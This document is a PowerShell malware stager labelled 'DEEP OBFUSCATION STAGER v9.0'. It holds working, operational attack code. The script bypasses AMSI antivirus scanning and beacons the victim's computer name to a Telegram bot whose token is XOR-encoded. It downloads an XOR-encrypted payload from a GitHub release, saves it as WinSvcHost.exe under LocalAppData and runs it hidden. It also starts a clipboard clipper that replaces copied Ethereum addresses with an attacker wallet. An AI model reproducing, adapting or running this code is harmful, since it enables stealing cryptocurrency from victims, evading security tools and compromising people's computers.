# --- [DEEP OBFUSCATION STAGER v9.0] ---

function Initialize-Environment {
    # Obfuscated AMSI Bypass (Hides 'AmsiUtils' from scanners)
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Amsi' + 'Utils')
        $a.GetField('amsi' + 'Init' + 'Failed','NonPublic,Static').SetValue($null,$true)
    } catch {}
}

function Send-Log {
    param($text)
    # Fully Encrypted Telegram String to bypass URL filters
    $k = 0xDE
    [byte[]]$t_e = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
    [byte[]]$c_e = 61,60,56,56,52,61,63,48,51,60
    $t = ""; foreach($b in $t_e){$t += [char]($b -bxor $k)}
    $c = ""; foreach($b in $c_e){$c += [char]($b -bxor $k)}
    
    # We use a randomized User-Agent to look like a browser
    $u = "h" + "tt" + "ps://api.telegram.org/bot$t/send" + "Message?chat_id=$c&text=$text"
    try { 
        $w = New-Object Net.WebClient
        $w.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $w.DownloadString($u) | Out-Null 
    } catch { }
}

# --- START ---
Initialize-Environment
Send-Log -text "STAGER_LOADED_ON_$($env:COMPUTERNAME)"

try {
    # 1. Obfuscated Paths
    $b = "h" + "ttps://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $l = "$env:LOCALAPPDATA\Mic" + "rosoft\Win" + "dows\Caches"
    if (!(Test-Path $l)) { New-Item $l -ItemType Directory -Force }
    $f = Join-Path $l "WinSvcHost.exe"

    # 2. Stealth Download
    $w = New-Object Net.WebClient
    $w.Headers.Add("User-Agent", "Mozilla/5.0")
    $d = $w.DownloadString($b)
    Send-Log -text "DOWNLOAD_COMPLETE"

    # 3. Memory Decryption
    $bytes = [Convert]::FromBase64String($d.Trim())
    for($i=0; $i -lt $bytes.count; $i++) { $bytes[$i] = $bytes[$i] -bxor 0xAB }
    
    # 4. Polymorphic Write
    $j = New-Object Byte[] (Get-Random -Min 100 -Max 500)
    (New-Object Random).NextBytes($j)
    [IO.File]::WriteAllBytes($f, ($bytes + $j))
    
    # 5. Execute & Background Clipper
    Start-Process -FilePath $f -WindowStyle Hidden
    
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        $w = @{ "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"; "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392" }
        while($true) {
            try {
                $c = [Windows.Forms.Clipboard]::GetText()
                if ($c -match "^0x[a-fA-F0-9]{40}$" -and $c -ne $w["eth"]) { [Windows.Forms.Clipboard]::SetText($w["eth"]) }
            } catch {}
            Start-Sleep -s 2
        }
    }

    Send-Log -text "TOTAL_SUCCESS_EXE_RUNNING"

} catch {
    Send-Log -text "ERROR_$($_.Exception.Message)"
}
